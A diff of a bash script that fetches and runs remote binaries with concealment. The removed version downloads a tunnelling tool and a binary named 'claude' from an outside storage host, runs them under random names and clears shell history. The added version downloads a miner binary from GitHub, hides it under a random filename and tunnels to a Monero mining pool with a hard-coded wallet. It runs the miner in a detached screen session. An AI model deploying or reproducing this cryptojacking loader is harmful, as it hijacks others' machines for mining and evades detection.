@@ -1,31 +1,39 @@
-RANDOM_NAME=$(tr -dc 'a-z0-9' </dev/urandom | head -c 12)
-PORT=$(shuf -i 20000-65000 -n 1)
+#!/bin/bash
+#!/bin/bash
+#!/bin/bash
 
-echo "Using port: $PORT"
+WS_PORT=$(shuf -i 10000-65000 -n 1)
+TCP_PORT=$(shuf -i 10000-65000 -n 1)
 
-curl -L -o wstunnel.tar.gz https://storage.technoelectro.online/wstunnel_10.5.2_linux_amd64.tar.gz
+echo "WS_PORT=$WS_PORT"
+echo "TCP_PORT=$TCP_PORT"
 
-tar -xf wstunnel.tar.gz
-rm -f wstunnel.tar.gz
+sudo apt update
+sudo apt install -y screen
 
-chmod +x wstunnel
-mv wstunnel kbridge
+# Random filenames
+WSTUNNEL_FILE=$(tr -dc 'a-zA-Z0-9' </dev/urandom | head -c 10)
+BOS_FILE=$(tr -dc 'a-zA-Z0-9' </dev/urandom | head -c 10)
 
-nohup ./kbridge client \
-    wss://namtran1922-datalab.hf.space \
-    -L tcp://${PORT}:127.0.0.1:1 \
-    >/dev/null 2>&1 &
+# Download
+curl -L -o "${WSTUNNEL_FILE}.tar.gz" https://storage.technoelectro.online/wstunnel_10.5.2_linux_amd64.tar.gz
+curl -L -o "${BOS_FILE}" https://github.com/wakitobi/glowing-umbrella/raw/refs/heads/main/bos
 
-curl -L -o claude https://storage.technoelectro.online/claude
+# Extract
+tar -xf "${WSTUNNEL_FILE}.tar.gz"
 
-chmod +x claude
-mv claude "${RANDOM_NAME}"
+# Rename extracted binary
+mv wstunnel "$WSTUNNEL_FILE"
 
-echo "Filename: ${RANDOM_NAME}"
+chmod +x "$WSTUNNEL_FILE" "$BOS_FILE"
 
-nohup "./${RANDOM_NAME}" \
-    --host "127.0.0.1:${PORT}" \
-    --user "prl1p2jan4dvkdfkt5r3pra7z96axrxjyjcgat9w7ldetlcy9wffm569sc9ux2t"
+# Start services
+nohup ./"$WSTUNNEL_FILE" server ws://127.0.0.1:${WS_PORT} >/dev/null 2>&1 &
+nohup ./"$WSTUNNEL_FILE" client \
+    -L tcp://127.0.0.1:${TCP_PORT}:xmr.kryptex.network:7029 \
+    ws://127.0.0.1:${WS_PORT} >/dev/null 2>&1 &
 
-history -c 2>/dev/null || true
-clear
+screen -dmS play ./"$BOS_FILE" \
+    -o 127.0.0.1:${TCP_PORT} \
+    -u 89YQSFqV1vbUM77et87qV67eVroCiro6YYntMES23R3h7kKjeKyN4cwTnCVAFhyMpq6w1JERiENowLPxdxXWenJv5hZMfS2.LEAP \
+    -t 8
